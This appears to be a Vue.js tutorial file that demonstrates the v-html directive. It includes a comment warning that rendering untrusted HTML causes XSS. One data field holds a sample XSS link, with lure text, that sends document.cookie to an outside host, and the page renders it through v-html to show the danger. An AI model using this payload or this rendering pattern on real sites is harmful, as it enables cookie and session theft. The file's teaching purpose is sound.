<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Document</title>
  <script src="../js/vue.js"></script>
</head>

<body>
  <!-- 
      v-html指令：
        1.作用：向指定节点中渲染包含html结构的内容。
        2.与差值语法的区别：
          (1).v-html会替换掉节点中的内容，{{x}}不会
          (2).v-html可以识别html结构。
        3.严重注意：
          (1).在网站上动态渲染任意html是非常危险的，容易导致XSS供给。
          (2).一定要在可信的内容上使用v-html，永远不要在用户提交的内容上使用v-html！  
    
   -->

  <div id="app">
    <h2>你好，{{name}}</h2>
    <h2 v-text="name"></h2>
    <div v-text="msg"></div>
    <div v-html="msg"></div>
    <div v-html="str"></div>
  </div>

  <script>
    Vue.config.productionTip = false; // 阻止 Vue 在启动时生成生产提示
    //创建Vue实例,得到 ViewModel
    let vm = new Vue({
      el: '#app',
      data: {
        name: '尚硅谷',
        msg:"<h2>你好啊</h2>",
        str:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟，我找到你想要的资源了！</a>'
      },
      methods: {}
    });
  </script>
</body>

</html>
